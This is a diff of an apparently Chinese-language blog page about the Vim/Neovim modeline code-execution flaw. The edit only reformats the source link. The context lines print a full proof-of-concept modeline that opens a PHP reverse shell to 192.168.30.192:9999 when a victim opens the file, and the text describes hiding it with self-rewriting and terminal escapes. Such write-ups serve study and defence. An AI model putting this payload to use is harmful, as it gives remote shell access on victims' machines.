@@ -321,7 +321,7 @@
 <h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p>该PoC概述了一种真实的攻击方法，其中一旦用户打开文件就启动反向shell。为了隐藏攻击，文件将在打开时立即重写。此外，PoC使用终端转义序列在打印内容时隐藏模式行cat。（cat -v揭示实际内容。）<br>macmacshell3.txt(原本的shell1.txt在mac下各种报错，nc/python/bash都不好使，php好使):</p>
 <pre><code>:!php -r &apos;$sock=fsockopen(&quot;192.168.30.192&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;
 </code></pre><p><img src="/images/48.jpg" alt="avatar"></p>
-<h3 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h3><p><a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md">https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md</a></p>
+<h3 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h3><p>[<a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md]">https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md]</a>(<a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md）">https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md）</a></p>
 
           
         
